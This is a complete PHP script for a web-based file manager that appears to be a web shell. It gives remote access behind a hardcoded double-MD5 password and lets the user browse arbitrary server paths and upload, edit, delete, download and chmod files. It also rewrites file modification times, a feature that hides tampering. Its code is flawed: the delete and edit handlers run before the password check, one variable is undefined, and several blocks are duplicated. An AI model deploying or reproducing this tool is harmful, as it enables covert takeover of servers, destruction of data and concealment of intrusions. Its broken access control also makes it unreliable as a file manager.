<?php
session_start();

// Function to sanitize user input
function sanitize($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

// Function to format the modification time
function formatModificationTime($timestamp) {
    return date('Y-m-d H:i', $timestamp);
}

// Function to get the current directory
function getCurrentDirectory() {
    return isset($_GET['p']) ? sanitize($_GET['p']) : '.';
}

// Function to get the full path of the selected item
function getFullPath($item) {
    return getCurrentDirectory() . DIRECTORY_SEPARATOR . $item;
}

// Function to get permissions of a file
function perms($file) {
    return substr(decoct(fileperms($file)), -3);
}

// Function to get permissions of a directory
function permsDir($dir) {
    return substr(decoct(fileperms($dir)), -4);
}



// Function to display the delete file form
function displayDeleteFileForm($filePath) {
    echo "<h5 class='border p-1 mb-3'>Delete File</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('delete') . "&n=" . urlencode(basename($filePath)) . "'>
            <p>Are you sure you want to delete the file?</p>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-danger rounded-0'>Delete</button>
            </div>
          </form>";
}


// Function to display the delete directory form
function displayDeleteDirForm($dirPath) {
    echo "<h5 class='border p-1 mb-3'>Delete Directory</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('delete_dir') . "&n=" . urlencode(basename($dirPath)) . "'>
            <p>Are you sure you want to delete the directory and its contents?</p>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-danger rounded-0'>Delete Directory</button>
            </div>
          </form>";
}

// Function to display the access form
function displayAccessForm() {
    echo "<h5 class='border p-1 mb-3'>Access Control</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('access_control') . "'>
            <div class='form-group'>
                <label for='password'>Password:</label>
                <input type='password' name='password' id='password' class='form-control'>
            </div>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Submit</button>
            </div>
          </form>";
}

// Function to delete a file
function deleteFile($filePath) {
    if (unlink($filePath)) {
        echo "<p>File deleted successfully.</p>";
    } else {
        echo "<p>Failed to delete the file.</p>";
    }
}

// Function to delete a directory
function deleteDir($dirPath) {
    if (is_dir($dirPath)) {
        $objects = scandir($dirPath);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dirPath . DIRECTORY_SEPARATOR . $object) && !is_link($dirPath . DIRECTORY_SEPARATOR . $object)) {
                    deleteDir($dirPath . DIRECTORY_SEPARATOR . $object);
                } else {
                    unlink($dirPath . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
        reset($objects);
        if (rmdir($dirPath)) {
            echo "<p>Directory deleted successfully.</p>";
        } else {
            echo "<p>Failed to delete the directory.</p>";
        }
    } else {
        echo "<p>Not a valid directory.</p>";
    }
}

// Check if the action is to delete a file
if (isset($_GET['a']) && $_GET['a'] === 'delete' && isset($_GET['n'])) {
    $deleteFile = sanitize($_GET['n']);
    $deleteFilePath = getFullPath($deleteFile);

    // Display confirmation form
    displayDeleteFileForm($deleteFilePath);

    // Handle form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['s'])) {
        // Delete the file
        deleteFile($deleteFilePath);
    }
}

// Check if the action is to delete a directory
if (isset($_GET['a']) && $_GET['a'] === 'delete_dir' && isset($_GET['n'])) {
    $deleteDir = sanitize($_GET['n']);
    $deleteDirPath = getFullPath($deleteDir);

    // Display confirmation form
    displayDeleteDirForm($deleteDirPath);

    // Handle form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['s'])) {
        // Delete the directory
        deleteDir($deleteDirPath);
    }
}

// Function to display the edit form
function displayEditForm($filePath) {
    echo "<h5 class='border p-1 mb-3'>Edit File</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit') . "&n=" . urlencode(basename($filePath)) . "'>
            <div class='form-group'>
                <label for='ctn'>Content:</label>
                <textarea name='ctn' id='ctn' cols='150' rows='20' class='form-control'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
            </div>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Save</button>
            </div>
          </form>";
}

// Function to display the edit permission form for files
function displayEditPermissionFormFile($filePath) {
    $currentPermission = perms($filePath);
    echo "<h5 class='border p-1 mb-3'>Edit Permission</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit_permission') . "&n=" . urlencode(basename($filePath)) . "'>
            <div class='form-group'>
                <label for='permission'>Permission (Numeric):</label>
                <input type='text' name='permission' id='permission' class='form-control' value='$currentPermission'>
            </div>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Save Permission</button>
            </div>
          </form>";
}

// Function to display the edit permission form for directories
function displayEditPermissionFormDir($dirPath) {
    $currentPermission = permsDir($dirPath);
    echo "<h5 class='border p-1 mb-3'>Edit Permission</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit_permission') . "&n=" . urlencode(basename($dirPath)) . "'>
            <div class='form-group'>
                <label for='permission'>Permission (Numeric):</label>
                <input type='text' name='permission' id='permission' class='form-control' value='$currentPermission'>
            </div>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Save Permission</button>
            </div>
          </form>";
}

// Function to display the edit modification time form
function displayEditModificationTimeForm($filePath) {
    $modificationTime = filemtime($filePath);
    echo "<h5 class='border p-1 mb-3'>Edit Modification Time</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit_modification_time') . "&n=" . urlencode(basename($filePath)) . "'>
            <div class='form-group'>
                <label for='modificationTime'>Modification Time:</label>
                <input type='datetime-local' name='modificationTime' id='modificationTime' class='form-control' value='" . date('Y-m-d\TH:i', $modificationTime) . "'>
            </div>
            <div class='form-group'>
                <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Save Modification Time</button>
            </div>
          </form>";
}

// Function to display the create directory form
function displayCreateDirForm() {
    echo "<h5 class='border p-1 mb-3'>Create Directory</h5>";
    echo "<form method='post' action='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('create_dir') . "'>
            <div class='form-group'>
                <label for='dirName'>Directory Name:</label>
                <input type='text' name='dirName' id='dirName' class='form-control'>
                <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Create Directory</button>
            </div>
          </form>";
}

// Function to handle file editing
if (isset($_GET['a']) && $_GET['a'] === 'edit' && isset($_GET['n'])) {
    $editFile = sanitize($_GET['n']);
    $editFilePath = getFullPath($editFile);

    // Check if file exists and is writable
    if (file_exists($editFilePath) && is_writable($editFilePath)) {
        // Process POST data if available
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ctn'])) {
            // Sanitize and get the edited content
            $editedContent = sanitize($_POST['ctn']);

            // Check if the edited content is not empty
            if (!empty($editedContent)) {
                // Save the edited content to the file
                if (file_put_contents($editFilePath, $editedContent) !== false) {
                    echo "<p>File edited successfully.</p>";
                } else {
                    $error = error_get_last();
                    echo "<p>Error saving file: " . $error['message'] . "</p>";
                }
            } else {
                echo "<p>Cannot save an empty file.</p>";
            }
        } else {
            // Display the edit form
            displayEditForm($editFilePath);
        }
    } else {
        echo "<p>Cannot edit the file. Either the file does not exist or it is not writable.</p>";
    }
}

// Function to handle editing permission
if (isset($_GET['a']) && $_GET['a'] === 'edit_permission' && isset($_GET['n'])) {
    $editItem = sanitize($_GET['n']);
    $editItemPath = getFullPath($editItem);

    if (file_exists($editItemPath)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
            $newPermission = $_POST['permission'];
            if (is_numeric($newPermission) && $newPermission >= 0 && $newPermission <= 777) {
                chmod($editItemPath, octdec($newPermission));
                echo "<p>Permission updated successfully.</p>";
            } else {
                echo "<p>Invalid permission value.</p>";
            }
        } else {
            if (is_file($editItemPath)) {
                displayEditPermissionFormFile($editItemPath);
            } else {
                displayEditPermissionFormDir($editItemPath);
            }
        }
    } else {
        echo "<p>Cannot edit permission. Either the item does not exist or it is not writable.</p>";
    }
}

// Function to handle editing modification time
if (isset($_GET['a']) && $_GET['a'] === 'edit_modification_time' && isset($_GET['n'])) {
    $editItem = sanitize($_GET['n']);
    $editItemPath = getFullPath($editItem);

    if (file_exists($editItemPath)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['modificationTime'])) {
            $newModificationTime = strtotime($_POST['modificationTime']);
            if ($newModificationTime !== false) {
                touch($editItemPath, $newModificationTime);
                echo "<p>Modification time updated successfully.</p>";
            } else {
                echo "<p>Invalid modification time value.</p>";
            }
        } else {
            displayEditModificationTimeForm($editItemPath);
        }
    } else {
        echo "<p>Cannot edit modification time. Either the item does not exist or it is not writable.</p>";
    }
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $uploadedFile = $_FILES['uploaded_file'];

    if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
        $uploadFilePath = getCurrentDirectory() . DIRECTORY_SEPARATOR . basename($uploadedFile['name']);

        if (move_uploaded_file($uploadedFile['tmp_name'], $uploadFilePath)) {
            echo "<p>File uploaded successfully.</p>";
        } else {
            echo "<p>Failed to upload the file.</p>";
        }
    } else {
        echo "<p>Error during file upload. Error code: " . $uploadedFile['error'] . "</p>";
    }
}

// Function to download a file
if (isset($_GET['download'])) {
    $downloadFile = sanitize($_GET['download']);
    $downloadPath = $currentDirectory . DIRECTORY_SEPARATOR . $downloadFile;

    if (file_exists($downloadPath) && is_file($downloadPath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Transfer-Encoding: Binary');
        header('Content-Length: ' . filesize($downloadPath));
        header('Content-disposition: attachment; filename="' . $downloadFile . '"');
        readfile($downloadPath);
        exit;
    }
}
// Handle directory creation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dirName'])) {
    $newDirName = sanitize($_POST['dirName']);
    $newDirPath = getCurrentDirectory() . DIRECTORY_SEPARATOR . $newDirName;

    if (!file_exists($newDirPath) && mkdir($newDirPath)) {
        echo "<p>Directory created successfully.</p>";
    } else {
        echo "<p>Failed to create the directory. Either the directory already exists or there was an error.</p>";
    }
}

// Handle access control
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $enteredPassword = md5(md5($_POST['password']));

    // Replace 'your_hashed_password' with the MD5 hash of your desired password
    $desiredPasswordHash = '223026b6657f760894e4330ee29ae2ac';

    if ($enteredPassword === $desiredPasswordHash) {
        $_SESSION['access_granted'] = true;
        $_SESSION['last_activity'] = time(); // Update last activity timestamp
        echo "<p>Access granted. You can now navigate through directories.</p>";
    } else {
        echo "<p>Access denied. Incorrect password.</p>";
    }
}

// Check if access is granted
if (!isset($_SESSION['access_granted']) || $_SESSION['access_granted'] !== true) {
    displayAccessForm();
    exit;
}

// Check if the session has expired (10 minutes of inactivity)
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 600)) {
    session_unset();
    session_destroy();
    echo "<p>Session expired. Please log in again.</p>";
    displayAccessForm();
    exit;
}

// Update last activity timestamp on every page load
$_SESSION['last_activity'] = time();

// Display the current directory path
echo "<p>Current Directory: " . getCurrentDirectory() . "</p>";

// Display a link to the parent directory (if not root)
if (getCurrentDirectory() !== '.') {
    $parentDirectory = realpath(getCurrentDirectory() . '/..');
    echo "<p><a href='?p=" . urlencode($parentDirectory) . "'>Parent Directory</a></p>";
}

// Get the list of files and directories in the current directory
$contents = scandir(getCurrentDirectory());

// Display the create directory form
displayCreateDirForm();
echo "<h5 class='border p-1 mb-3'>Upload File</h5>
<form method='post' action='' enctype='multipart/form-data'>
    <div class='form-group'>
        <label for='uploaded_file'>Choose a file:</label>
        <input type='file' name='uploaded_file' id='uploaded_file' class='form-control' required>
        <button type='submit' name='s' class='btn btn-outline-light rounded-0'>Upload File</button>
    </div>
</form>";
// Display a table with the list of files and directories
echo "<table border='1'>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modification Time</th>
            <th>Permission</th>
            <th>Action</th>
        </tr>";

foreach ($contents as $item) {
    if ($item == '.' || $item == '..') {
        continue;
    }

    $itemPath = getFullPath($item);
    $size = is_file($itemPath) ? filesize($itemPath) : '';
    $permission = is_file($itemPath) ? perms($itemPath) : permsDir($itemPath);

    echo "<tr>
            <td><a href='?p=" . urlencode($itemPath) . "'>$item</a></td>
            <td>" . (is_dir($itemPath) ? 'Directory' : 'File') . "</td>
            <td>$size</td>
            <td>" . formatModificationTime(filemtime($itemPath)) . "</td>
            <td>$permission</td>
            <td>";

    if (is_file($itemPath)) {
        echo "<a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('download') . "&file=" . urlencode($item) . "'>Download</a>";
        echo " | <a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit') . "&n=" . urlencode($item) . "'>Edit</a>";
        echo " | <a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit_permission') . "&n=" . urlencode($item) . "'>Edit Permission</a>";
        // For files, set delete link to 'delete'
        echo " | <a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('delete') . "&n=" . urlencode($item) . "'>Delete</a>";
    } else {
        // For directories, set delete link to 'delete_dir'
        echo " | <a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('delete_dir') . "&n=" . urlencode($item) . "'>Delete Directory</a>";
        echo " | <a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit_permission') . "&n=" . urlencode($item) . "'>Edit Permission</a>";
    }

    echo " | <a href='?p=" . urlencode(getCurrentDirectory()) . "&a=" . urlencode('edit_modification_time') . "&n=" . urlencode($item) . "'>Edit Modification Time</a>";
    
    echo "</td>
          </tr>";
}

echo "</table>";




// Function to handle file editing
if (isset($_GET['a']) && $_GET['a'] === 'edit' && isset($_GET['n'])) {
    $editFile = sanitize($_GET['n']);
    $editFilePath = getFullPath($editFile);

    // Check if file exists and is writable
    if (file_exists($editFilePath) && is_writable($editFilePath)) {
        // Process POST data if available
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ctn'])) {
            // Sanitize and get the edited content
            $editedContent = sanitize($_POST['ctn']);

            // Check if the edited content is not empty
            if (!empty($editedContent)) {
                // Save the edited content to the file
                if (file_put_contents($editFilePath, $editedContent) !== false) {
                    echo "<p>File edited successfully.</p>";
                } else {
                    $error = error_get_last();
                    echo "<p>Error saving file: " . $error['message'] . "</p>";
                }
            } else {
                echo "<p>Cannot save an empty file.</p>";
            }
        } else {
            // Display the edit form
            displayEditForm($editFilePath);
        }
    } else {
        echo "<p>Cannot edit the file. Either the file does not exist or it is not writable.</p>";
    }
}


// Function to handle editing permission
if (isset($_GET['a']) && $_GET['a'] === 'edit_permission' && isset($_GET['n'])) {
    $editItem = sanitize($_GET['n']);
    $editItemPath = getFullPath($editItem);

    if (file_exists($editItemPath)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
            $newPermission = $_POST['permission'];
            if (is_numeric($newPermission) && $newPermission >= 0 && $newPermission <= 777) {
                chmod($editItemPath, octdec($newPermission));
                echo "<p>Permission updated successfully.</p>";
            } else {
                echo "<p>Invalid permission value.</p>";
            }
        } else {
            if (is_file($editItemPath)) {
                displayEditPermissionFormFile($editItemPath);
            } else {
                displayEditPermissionFormDir($editItemPath);
            }
        }
    } else {
        echo "<p>Cannot edit permission. Either the item does not exist or it is not writable.</p>";
    }
}

// Function to handle editing modification time
if (isset($_GET['a']) && $_GET['a'] === 'edit_modification_time' && isset($_GET['n'])) {
    $editItem = sanitize($_GET['n']);
    $editItemPath = getFullPath($editItem);

    if (file_exists($editItemPath)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['modificationTime'])) {
            $newModificationTime = strtotime($_POST['modificationTime']);
            if ($newModificationTime !== false) {
                touch($editItemPath, $newModificationTime);
                echo "<p>Modification time updated successfully.</p>";
            } else {
                echo "<p>Invalid modification time value.</p>";
            }
        } else {
            displayEditModificationTimeForm($editItemPath);
        }
    } else {
        echo "<p>Cannot edit modification time. Either the item does not exist or it is not writable.</p>";
    }
}

?>